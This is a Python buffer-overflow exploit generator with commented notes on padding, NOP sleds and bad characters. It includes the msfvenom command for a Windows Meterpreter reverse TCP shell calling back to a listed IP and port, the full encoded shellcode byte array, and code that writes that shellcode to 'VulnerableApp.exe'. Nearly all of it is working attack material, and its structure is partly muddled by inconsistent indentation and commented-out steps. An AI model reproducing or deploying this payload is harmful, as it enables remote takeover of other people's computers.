import struct

    overflow = "A"*3000
    
    ##Creating Pattern
    #pattern = ' '

    #f.write(pattern)


    ##NUPs:
    #f.write('\x90\' *100)

    ##BadChars = \x00, \x01 (May require more and if so will need to re-run the     msfvenom command including them

    #SHELLCODE CREATION:
	##Running the following command on Kali produces a Payload size of of 481 b     ytes fitting within the 540???????????????????????????????????????????????      ?? bytes available creating a reverse TCP shell to a netcat session, comm       and: "msfvenom -n 100 -p windows/meterpreter/reverse_tcp -f python -a x8        6 --platform windows -b "\x00\x01" -e x86/shikata_ga_nai LHOST=192.168.         141.129 LPORT=1337 > Eploitable_meterpreter_reverse_shell.sc"

	buf =  b""
	buf += b"\xf8\x9b\x9b\x4a\xf5\xf5\x90\xf9\x48\x40\xfd\x2f\x27"
	buf += b"\xf8\x92\x4b\x98\xfd\xf5\x2f\x37\x27\xfc\x37\x48\xf8"
	buf += b"\x43\x27\x90\x37\x99\x48\x42\x4a\x42\x91\x9b\x93\x92"
	buf += b"\xfd\x42\x90\x9f\x98\x42\x49\x93\x90\x43\x43\x48\xfc"
	buf += b"\xf8\xf8\x41\x90\x49\x98\x93\x92\xf9\x3f\x42\xf8\x9f"
	buf += b"\x27\xd6\xf5\x9b\x27\x41\x2f\x49\x2f\xf5\xfc\x9b\x2f"
	buf += b"\x9f\x40\x99\xd6\x90\x9f\xf5\xf5\x9f\x40\x4a\x42\x4b"
	buf += b"\x48\xf8\x37\x48\x48\x43\x9f\xf8\xd6\xda\xc2\xd9\x74"
	buf += b"\x24\xf4\x5f\x33\xc9\xb1\x59\xbd\xde\xcd\x6f\x3b\x83"
	buf += b"\xef\xfc\x31\x6f\x15\x03\x6f\x15\x3c\x38\x93\xd3\x4f"
	buf += b"\xc3\x6c\x24\x2f\x4d\x89\x15\x7d\x29\xd9\x04\xb1\x39"
	buf += b"\x8f\xa4\x3a\x6f\x24\xba\x8b\xda\x62\xf5\x0c\x51\x18"
	buf += b"\xdd\xc3\xa6\x71\x21\x42\x5b\x88\x76\xa4\x62\x43\x8b"
	buf += b"\xa5\xa3\x15\xe1\x4a\x79\xf1\x82\xc6\x6e\x76\xd6\xda"
	buf += b"\x8f\x58\x5c\x62\xe8\xdd\xa3\x16\x44\xdf\xf3\x5d\x1c"
	buf += b"\xc7\xa3\xea\xc5\xd7\x42\x3f\x70\xde\x31\x83\x4a\x1e"
	buf += b"\xf0\x70\x98\x6b\x02\x50\xd0\xab\xa9\x9d\xdc\x21\xb3"
	buf += b"\xda\xdb\xd9\xc6\x10\x18\x67\xd1\xe3\x62\xb3\x54\xf3"
	buf += b"\xc5\x30\xce\xd7\xf4\x95\x89\x9c\xfb\x52\xdd\xfa\x1f"
	buf += b"\x64\x32\x71\x1b\xed\xb5\x55\xad\xb5\x91\x71\xf5\x6e"
	buf += b"\xbb\x20\x53\xc0\xc4\x32\x3b\xbd\x60\x39\xae\xa8\x15"
	buf += b"\xc2\x30\xd5\x4b\x54\xfc\x18\x74\xa4\x6a\x2a\x07\x96"
	buf += b"\x35\x80\x8f\x9a\xbe\x0e\x57\xab\xa9\xb0\x87\x13\xb9"
	buf += b"\x4e\x28\x63\x93\x94\x7c\x33\x8b\x3d\xfd\xd8\x4b\xc1"
	buf += b"\x28\x74\x46\x55\x13\x20\xdb\x24\xfb\x32\xe4\x23\xc5"
	buf += b"\xbb\x02\x7b\x65\xeb\x9a\x3c\xd5\x4b\x4b\xd5\x3f\x44"
	buf += b"\xb4\xc5\x3f\x8f\xdd\x6c\xd0\x79\xb5\x18\x49\x20\x4d"
	buf += b"\xb8\x96\xff\x2b\xfa\x1d\xf5\xcc\xb5\xd5\x7c\xdf\xa2"
	buf += b"\x81\x7e\x1f\x33\x24\x7e\x75\x37\xee\x29\xe1\x35\xd7"
	buf += b"\x1d\xae\xc6\x32\x1e\xa9\x39\xc3\x16\xc1\x0c\x51\x16"
	buf += b"\xbd\x70\xb5\x96\x3d\x27\xdf\x96\x55\x9f\xbb\xc5\x40"
	buf += b"\xe0\x11\x7a\xd9\x75\x9a\x2a\x8d\xde\xf2\xd0\xe8\x29"
	buf += b"\x5d\x2b\xdf\x29\x9a\xd3\x9d\x05\x03\xbb\x5d\x16\xb3"
	buf += b"\x3b\x34\x96\xe3\x53\xc3\xb9\x0c\x93\x2c\x10\x45\xbb"
	buf += b"\xa7\xf5\x27\x5a\xb7\xdf\xe6\xc2\xb8\xec\x32\xf5\xc3"
	buf += b"\x9d\xc5\xf6\x33\xb4\xa1\xf7\x33\xb8\xd7\xc4\xe5\x81"
	buf += b"\xad\x0b\x36\xb6\xbe\x3e\x1b\x9f\x54\x40\x0f\xdf\x7c"

	f = open("VulnerableApp.exe", "w")

	f.write(buf)


print('[MLT] Exploit File Generated')
